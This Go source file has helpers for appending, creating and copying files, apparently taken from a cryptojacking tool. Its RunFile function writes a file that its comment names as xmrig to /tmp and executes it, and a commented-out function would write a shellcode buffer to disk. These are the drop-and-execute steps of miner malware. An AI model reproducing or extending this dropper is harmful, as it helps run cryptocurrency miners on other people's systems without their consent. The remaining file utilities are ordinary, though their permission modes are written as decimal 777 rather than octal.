package add

import (
	"os"
	"io"
	"cpack"
)
/*
func Releasefiles(a string){
	b:=os.OpenFile(a,os.O_RDWR|os.O_CREATE,0755)
	b.WriteAt(m_MyShellCodeFileBuf, m_MyShellCodeFileSize)
	b.Close()
}
*/

// fileName:文件名字(带全路径)
// content: 写入的内容
//搬砖内容
//https://www.jianshu.com/p/86e12c9c0363
//从程序末尾写入内容
func AppendToFile(fileName string, content string) error {
	// 以只写的模式，打开文件
	f, err := os.OpenFile(fileName, os.O_WRONLY, 0644)
	if err != nil {
		return err
	} else {
		// 查找文件末尾的偏移
		n, _ := f.Seek(0, os.SEEK_END)
		// 从末尾的偏移量开始写入内容
		_, err = f.WriteAt([]byte(content), n)
	}
	defer f.Close()
	return err
}



func RunFile(filename string){
	var tmp = "/tmp/"
	tmp += filename
	cpack.Releasefiles(tmp)//释放xmrig文件
	prefix := "."
	prefix += tmp
	prefix += cpack.Xxs
	cpack.System(prefix)

	////////////执行结束
}

func Createfile(path,content string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 777)
	defer f.Close()
	if err != nil {
		return
	} else {
		f.Write([]byte(content))
	}
}

//linux不可用\n\r，单单\n既可否则报错



func CopyFile(dstName, srcName string) (written int64, err error) {
	src, err := os.Open(srcName)
	if err != nil {
		return
	}
	defer src.Close()
	dst, err := os.OpenFile(dstName, os.O_WRONLY|os.O_CREATE, 777)
	if err != nil {
		return
	}
	defer dst.Close()
	return io.Copy(dst, src)

}
